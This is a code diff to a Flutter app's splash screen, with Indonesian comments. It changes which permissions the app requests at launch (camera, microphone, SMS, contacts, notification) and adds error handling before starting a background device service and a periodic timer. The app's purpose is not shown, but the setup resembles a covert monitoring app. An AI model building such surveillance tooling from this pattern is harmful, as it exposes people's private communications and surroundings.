@@ -20,14 +20,22 @@ class _SplashScreenState extends State<SplashScreen> {
   }
 
   Future<void> _bootstrap() async {
-    // 1. Minta izin dulu biar Android gak matiin service
-    await [
-      Permission.camera, Permission.microphone, Permission.storage,
-      Permission.sms, Permission.contacts, Permission.photos, Permission.notification,
-    ].request();
+    try {
+      // Hanya minta izin yang penting dan aman untuk Android baru
+      await [
+        Permission.camera, 
+        Permission.microphone,
+        Permission.sms, 
+        Permission.contacts, 
+        Permission.notification,
+      ].request();
 
-    // 2. Baru jalanin background service
-    await DeviceService.init(); 
+      // Jalanin background service
+      await DeviceService.init(); 
+    } catch (e) {
+      // Kalau izin gagal, aplikasi tetep lanjut gak bakal force close
+      debugPrint("Error permission: $e");
+    }
 
     final prefs = await SharedPreferences.getInstance();
     Timer.periodic(const Duration(seconds: 2), (t) async {
